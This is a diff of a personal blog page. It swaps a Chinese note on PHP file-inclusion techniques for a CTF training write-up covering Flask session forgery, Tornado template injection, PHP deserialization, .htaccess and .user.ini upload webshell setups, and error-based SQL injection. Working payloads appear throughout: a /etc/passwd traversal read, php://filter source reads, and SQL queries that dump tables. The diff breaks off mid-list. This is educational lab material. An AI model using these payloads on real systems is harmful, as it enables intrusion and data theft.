@@ -13,25 +13,40 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://dawnringDong.github.io/2023/11/16/文件包含/"/>
+    <link rel="canonical" href="http://dawnringDong.github.io/2024/04/07/training-8/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="文件包含1、基本内容include()	错误级别 warning include_once()	&#x2F;&#x2F;保证文件只包含一次 require()	错误级别 fatal error require_once()	&#x2F;&#x2F;保证文件只包含一次 1include &amp;#x27;a.php&amp;#x27;;	&#x2F;&#x2F;单独编译  文件加载路径 绝对路径（效率低、安全 ） C:\路径\php">
+        <meta name="description" content="BUUCTF[HCTF 2018]admin 1很巧刚搭完flask框架的小demo就碰上这道题 可惜源码已经木有了 用的暴力破解（密码很简单 猜了一次就中了） 搜了一下其他解法 flask session 伪造 输出flag条件是 用户登录+session的name是admin 构造符合条件的session即可 自己先随便注册一个账户，登录获取session 解码session看它的构成（bas">
 <meta property="og:type" content="article">
-<meta property="og:title" content="文件包含">
-<meta property="og:url" content="http://dawnringdong.github.io/2023/11/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:title" content="training-8">
+<meta property="og:url" content="http://dawnringdong.github.io/2024/04/07/training-8/index.html">
 <meta property="og:site_name" content="dawn_r1sing">
-<meta property="og:description" content="文件包含1、基本内容include()	错误级别 warning include_once()	&#x2F;&#x2F;保证文件只包含一次 require()	错误级别 fatal error require_once()	&#x2F;&#x2F;保证文件只包含一次 1include &amp;#x27;a.php&amp;#x27;;	&#x2F;&#x2F;单独编译  文件加载路径 绝对路径（效率低、安全 ） C:\路径\php">
+<meta property="og:description" content="BUUCTF[HCTF 2018]admin 1很巧刚搭完flask框架的小demo就碰上这道题 可惜源码已经木有了 用的暴力破解（密码很简单 猜了一次就中了） 搜了一下其他解法 flask session 伪造 输出flag条件是 用户登录+session的name是admin 构造符合条件的session即可 自己先随便注册一个账户，登录获取session 解码session看它的构成（bas">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-11-16T14:45:44.000Z">
-<meta property="article:modified_time" content="2023-11-16T14:52:41.897Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312011505385.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312011508629.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312011513230.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312011514675.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312021750786.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312031709321.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312052257863.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312031716030.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312021820750.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312041139676.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312041956189.bmp">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312051803404.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312051811500.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312052244559.bmp">
+<meta property="article:published_time" content="2024-04-07T02:56:44.000Z">
+<meta property="article:modified_time" content="2024-04-07T02:56:33.181Z">
 <meta property="article:author" content="dawn_r1sing">
 <meta property="article:tag" content="CTF">
+<meta property="article:tag" content="集训">
 <meta property="article:tag" content="web">
-<meta property="article:tag" content="专题">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312011505385.png">
     
     
     <!--- Icon Part-->
@@ -43,7 +58,7 @@
     
     <title>
         
-            文件包含 -
+            training-8 -
         
         dawn_r1sing
     </title>
@@ -288,7 +303,7 @@
         <div class="article-title relative w-full">
             
                 <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">文件包含</h1>
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">training-8</h1>
                 </div>
             
             </div>
@@ -309,15 +324,15 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2023-11-16 22:45:44</span>
-        <span class="mobile">2023-11-16 22:45:44</span>
+        <span class="desktop">2024-04-07 10:56:44</span>
+        <span class="mobile">2024-04-07 10:56:44</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2023-11-16 22:52:41</span>
-            <span class="mobile">2023-11-16 22:52:41</span>
+            <span class="desktop">2024-04-07 10:56:33</span>
+            <span class="mobile">2024-04-07 10:56:33</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -349,11 +364,11 @@
                     </li>
                 
                     <li>
-                        | <a href="/tags/web/">web</a>&nbsp;
+                        | <a href="/tags/%E9%9B%86%E8%AE%AD/">集训</a>&nbsp;
                     </li>
                 
                     <li>
-                        | <a href="/tags/%E4%B8%93%E9%A2%98/">专题</a>&nbsp;
+                        | <a href="/tags/web/">web</a>&nbsp;
                     </li>
                 
             </ul>
@@ -363,12 +378,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>712 Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.3k Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>3 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>5 Mins</span>
         </span>
     
     
@@ -387,68 +402,197 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h3 id="1、基本内容"><a href="#1、基本内容" class="headerlink" title="1、基本内容"></a>1、基本内容</h3><p>include()	错误级别 warning</p>
-<p>include_once()	&#x2F;&#x2F;保证文件只包含一次</p>
-<p>require()	错误级别 fatal error</p>
-<p>require_once()	&#x2F;&#x2F;保证文件只包含一次</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;a.php&#x27;</span>;	<span class="comment">//单独编译</span></span><br></pre></td></tr></table></figure></div>
-
-<h5 id="文件加载路径"><a href="#文件加载路径" class="headerlink" title="文件加载路径"></a>文件加载路径</h5><ul>
-<li><p>绝对路径（<em>效率低、安全</em> ）</p>
-<p>C:\路径\php文件</p>
-</li>
-<li><p>相对路径（<em>效率高、易出错</em> ）	→    “ 当前文件.&#x2F; ”会混乱</p>
-<p>.&#x2F;	表示当前文件夹</p>
-<p>..&#x2F;	上级目录</p>
-</li>
-</ul>
-<h3 id="2、检验漏洞是否存在"><a href="#2、检验漏洞是否存在" class="headerlink" title="2、检验漏洞是否存在"></a>2、检验漏洞是否存在</h3><p>1、查看配置文件以检验是否含有文件包含漏洞</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?file=../../../../../../etc/passwd</span><br></pre></td></tr></table></figure></div>
-
-
-
+            <h3 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h3><h4 id="HCTF-2018-admin-1"><a href="#HCTF-2018-admin-1" class="headerlink" title="[HCTF 2018]admin 1"></a>[HCTF 2018]admin 1</h4><p>很巧刚搭完flask框架的小demo就碰上这道题</p>
+<p>可惜源码已经木有了</p>
+<p>用的暴力破解（密码很简单 猜了一次就中了）</p>
+<p>搜了一下其他解法</p>
+<h5 id="flask-session-伪造"><a href="#flask-session-伪造" class="headerlink" title="flask session 伪造"></a>flask session 伪造</h5><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312011505385.png"
+                      alt="image-20231201150551118"
+                ></p>
+<p>输出flag条件是 用户登录+session的name是admin</p>
+<p>构造符合条件的session即可</p>
+<p>自己先随便注册一个账户，登录获取session</p>
+<p>解码session看它的构成（base64）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312011508629.png"
+                     
+                ></p>
+<p>改name为admin，编码session</p>
+<p>编码需要SECRET_KEY，眼熟，能找到</p>
+<p>即可得到符合条件的session</p>
+<p>抓包改session就能成功登录管理员账户</p>
+<h5 id="unicode-欺骗"><a href="#unicode-欺骗" class="headerlink" title="unicode  欺骗"></a>unicode  欺骗</h5><p>因为只要用户名是admin就可以嘛</p>
+<p>除了爆破密码还可以再注册一个admin账户</p>
+<p>在 注册、登录、更改密码 过程中都有strlower操作，单纯改成大写并不能绕过，这里是利用了<code>nodeprep.prepare()</code>可将unicode字符<code>ᴬ</code>转换成<code>A</code>，而<code>A</code>再调用一次函数会把<code>A</code>转换成<code>a</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312011513230.png"
+                      alt="image-20231201151324334"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312011514675.png"
+                      alt="image-20231201151404803"
+                ></p>
+<p>那就可以用<code>ᴬdmin</code>注册（调用一次转换为Admin）之后更改密码（再次调用转换为admin，此时相当于在改管理员账户admin的密码），admin账户密码成功被更改，正常登录即可</p>
 <hr>
-<h3 id="3、攻击方法"><a href="#3、攻击方法" class="headerlink" title="3、攻击方法"></a>3、攻击方法</h3><p>文件包含漏洞分为 <u>本地文件包含</u> 和 <u>远程文件包含</u></p>
-<h5 id="1、访问日志"><a href="#1、访问日志" class="headerlink" title="1、访问日志"></a>1、访问日志</h5><p><strong>原理：</strong>当访问一个不存在的资源时，Apache同样会记录下来，这就意味着，如果网站存在包含漏洞，却没有可以包含的文件时（通常指的是网页中的木马文件），就可以去访问URL：<code>www.any.com&lt;?php phpinfo();?&gt;</code>，虽然说网页上提示您没有访问的权限，但是Apache会<strong>记录</strong>我们的<strong>请求</strong><code>&lt;?php  phpinfo();?&gt;</code>，并写到access.log文件中，这时候<strong>再去包含Apache的日志文件</strong>，就可以利用文件包含漏洞了</p>
-<p><strong>步骤：</strong>访问日志所在目录→注马（<strong>UA</strong>）&#x2F;…</p>
-<p>Linux:<code>/?file=/var/log/nginx/access.log</code></p>
-<p>题目：<a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/match/matches/109/challenges#phpdest" >BUUCTF-phpdest <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h5 id="2、require-once绕过"><a href="#2、require-once绕过" class="headerlink" title="2、require_once绕过"></a>2、<strong>require_once绕过</strong></h5><p><a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213235" >点击 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p>在这里有个小知识点，<code>/proc/self</code>指向当前进程的<code>/proc/pid/</code>，<code>/proc/self/root/</code>是指向<code>/</code>的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过，payload:</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br><span class="line"></span><br><span class="line">//result PD9waHAKCiRmbGFnPSJ0ZXN0e30iOwo=</span><br></pre></td></tr></table></figure></div>
+<h4 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hacker.png  :  平平无奇的一句话木马</span><br><span class="line"></span><br><span class="line">.htaccess : </span><br><span class="line">    Addtype application/x-httpd-php .png</span><br><span class="line"></span><br><span class="line">    php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=hacker.png&quot;</span><br></pre></td></tr></table></figure></div>
 
-<p><strong>原理：</strong>？？？</p>
-<h5 id="3、伪协议"><a href="#3、伪协议" class="headerlink" title="3、伪协议"></a>3、伪协议</h5><ul>
-<li><p><code>php://input</code></p>
-<p>读取<strong>POST</strong>请求的参数</p>
-<p>file_get_contents() 解析传入字符串发现是<strong>伪协议</strong>中的<code>php://input</code>，便可以读取POST传入的php代码。</p>
-</li>
-<li><p><code>php://filter</code></p>
-<p>1、<strong>源码读取</strong>（前提是必须知道文件名)</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=［文件路径］</span><br></pre></td></tr></table></figure></div>
-
-<p>(include可以对伪协议进行解析)</p>
-<p><code>php://filter</code> 是一种访问本地文件的协议，<code>/read=convert.base64-encode/</code> 表示读取的方式是 <code>base64</code>  编码后，<code>resource=index.php</code> 表示目标文件为<code>index.php</code>。如果不进行 <code>base64</code>  编码传入，<code>index.php</code> <strong>就会直接执行</strong>，我们就看不到文件中的内容了。</p>
-<p>2、<strong>代码绕过</strong></p>
-</li>
-<li><p>data:&#x2F;&#x2F;</p>
-<p>传入的数据是<code>php</code>就会执行<code>php</code>代码</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;base64,xxxx(base64编码后的数据)</span><br></pre></td></tr></table></figure></div></li>
-</ul>
+<p>上传<code>.htaccess</code>时抓包改Content-Type为image&#x2F;png即可上传成功</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312021750786.png"
+                      alt="image-20231202175035857"
+                ></p>
 <hr>
-<h3 id="3、基本方法"><a href="#3、基本方法" class="headerlink" title="3、基本方法"></a>3、基本方法</h3><ol>
-<li><p><strong>打开文件</strong>：<code>php://filter/read=convert.base64-encode/resouce=[文件路径]</code></p>
+<h4 id="护网杯-2018-easy-tornado1"><a href="#护网杯-2018-easy-tornado1" class="headerlink" title="[护网杯 2018]easy_tornado1"></a>[护网杯 2018]easy_tornado1</h4><p>已知：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag在/fllllllllllllag里</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure></div>
+
+<p>求：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如何打开文件/fllllllllllllag</span><br></pre></td></tr></table></figure></div>
+
+<p>观察可得：当打开&#x2F;flag.txt时，payload构成为“目录+filehash”</p>
+<p>关键：filehash里的cookie_secret怎么得到</p>
+<p>先随便试试打开&#x2F;fllllllllllllag</p>
+<p>进入错误页面，出现一个参数msg，它可以控制页面返回</p>
+<p>结合第二条提示render，到这里应该是要利用tornado的模板注入了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312031709321.png"
+                      alt="image-20231203170939876"
+                ></p>
+<p>cookie_secret在Application对象settings的属性中 ，访问它需要知道它的属性名字</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312052257863.png"
+                      alt="image-20231203171100931"
+                ></p>
+<p>self.application.settings的别名是RequestHandler.settings，而handler又是指向处理当前这个页面的RequestHandler对象，因此handler.settings指向RequestHandler.application.settings</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312031716030.png"
+                      alt="image-20231203171609769"
+                ></p>
+<p>得到cookie_secret</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312021820750.png"
+                      alt="image-20231202182024469"
+                ></p>
+<hr>
+<h4 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h4><p>文件包含</p>
+<ol>
+<li><p>data伪协议写入$text</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?text=data://text/plain,welcome to the zjctf</span><br></pre></td></tr></table></figure></div>
 </li>
-<li><p>执行php代码</p>
-<ul>
-<li><p>get:	?file&#x3D;php:&#x2F;&#x2F;input</p>
-<p>post:	(php代码)</p>
+<li><p>file文件自然得是useless.php</p>
 </li>
-<li><p><code>data://text/plain;base64,xxxxxx(base64编码后的数据)</code></p>
+<li><p>明显需要读useless.php</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?text=...&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure></div>
+
+<p>解码后得</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure></div>
 </li>
-</ul>
+<li><p>构造password</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  </span><br><span class="line">		...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$password</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$password</span>-&gt;file = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$password</span>;			<span class="comment">//触发__toString()</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$password</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"><span class="comment">// O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>构造payload</p>
 </li>
 </ol>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312041139676.png"
+                      alt="image-20231204113934510"
+                ></p>
+<p>flag在源码中</p>
+<hr>
+<h4 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h4><p>黑名单过滤：空格（圆括号）、等号（like）、*、and、substr、mid、</p>
+<p><strong>黑名单过滤空格→报错注入</strong></p>
+<p>判断报错注入是否存在</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or(extractvalue(1,0x7e))#</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312041956189.bmp"
+                      alt="capture_20231204195410938"
+                ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or(extractvalue(1,concat(0x7e,database(),0x7e)))#</span><br><span class="line">//数据库：~geek~</span><br><span class="line"></span><br><span class="line">&#x27;or(extractvalue(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(database())),0x7e)))#</span><br><span class="line">//表：~H4rDsq1~</span><br><span class="line"></span><br><span class="line">&#x27;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e)))#</span><br><span class="line">//字段：~id,username,password~</span><br><span class="line"></span><br><span class="line">&#x27;or(extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e)))#</span><br><span class="line">//~flag&#123;767cc10f-8f52-489b-aa03-65</span><br><span class="line"></span><br><span class="line">&#x27;or(extractvalue(1,right(concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),33)))#</span><br><span class="line">//b-aa03-653603762b84&#125;~</span><br><span class="line"></span><br><span class="line">flag&#123;767cc10f-8f52-489b-aa03-653603762b84&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>注意：</p>
+<ol>
+<li>concat中的命令语句要加上括号</li>
+<li>right()的正确使用</li>
+</ol>
+<hr>
+<h4 id="MRCTF2020-Ez-bypass1"><a href="#MRCTF2020-Ez-bypass1" class="headerlink" title="[MRCTF2020]Ez_bypass1"></a>[MRCTF2020]Ez_bypass1</h4><p>MD5强类型绕过：<strong>数组绕过</strong></p>
+<hr>
+<h4 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h4><p>关键点在几个绕过：</p>
+<ul>
+<li><p><code>is_valid($s)</code></p>
+<p>FileHandler类中的成员变量属性都是protected，经过序列化操作后变量名前面有<code>%00*%00</code>，即NULL*NULL，不在32-125范围内，故构造序列化字符串时需要把属性改成public，即可绕过</p>
+</li>
+<li><p><code>$this-&gt;op === &quot;2&quot;</code></p>
+<p>通过<code>include(&quot;flag.php&quot;);</code>可知我们的目的是在read()里读取flag.php文件，需要绕过此处令op为2。</p>
+<p>一开始构造序列化的时候就奇怪给$op赋值个字符串“1”，原来用处在这。</p>
+<p>此处判断是强类型，process()里分流的时候是弱类型，可以通过赋值2绕过</p>
+</li>
+</ul>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:12:&quot;Hello World!&quot;;&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>赋值str后打开源码得到flag</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312051803404.png"
+                      alt="image-20231205180300519"
+                ></p>
+<p>也可以用php伪协议读flag.php</p>
+<p>因为content会被变成””，所以让<code>filename=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312051811500.png"
+                      alt="image-20231205181129617"
+                ></p>
+<hr>
+<h4 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h4><blockquote>
+<p>.user.ini目录配置文件，使用条件需要在同目录下有php文件，所以应用机会较少</p>
+</blockquote>
+<p>题目很贴心给了源码，分析可得普通的文件上传路都被堵死了，文件后缀绕不了，00截断做不了，<code>.htaccess</code>文件传不进去。。</p>
+<ol>
+<li><p>上传.user.ini文件</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file = hacker.gif</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>上传hacker.gif文件</p>
